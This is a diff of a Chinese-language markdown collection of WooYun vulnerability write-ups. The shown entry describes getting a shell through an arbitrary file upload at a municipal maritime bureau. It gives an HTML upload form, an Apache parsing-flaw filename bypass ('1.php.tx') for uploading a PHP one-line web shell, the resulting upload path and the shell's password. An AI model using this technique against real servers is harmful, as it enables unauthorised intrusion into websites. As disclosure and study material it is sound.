@@ -66,11 +66,13 @@ test.php::$DATA //成功
   
 ###7. 四川某市海事局存在任意文件上传漏洞getshell  
 链接：http://wooyun.org/bugs/wooyun-2010-0189600  
-* 构造表单,上传一句话：  
+* 构造表单,上传一句话： 
+```
 <form action="http://**.**.**.**/webservice/upload/upload.php" form enctype="multipart/form-data" method="POST">  
 <input name="file" type="file">  
 <input name="" type="submit">  
-</form>  
+</form>
+```
 * 直接上传PHP文件会被拦截，所以需要结合apache的解析漏洞来绕过，上传文件的文件名为1.php.tx  
 * 根据返回的信息获取上传后的路径：http://**.**.**.**/attachment/616390554/1.php.tx  
   密码为c
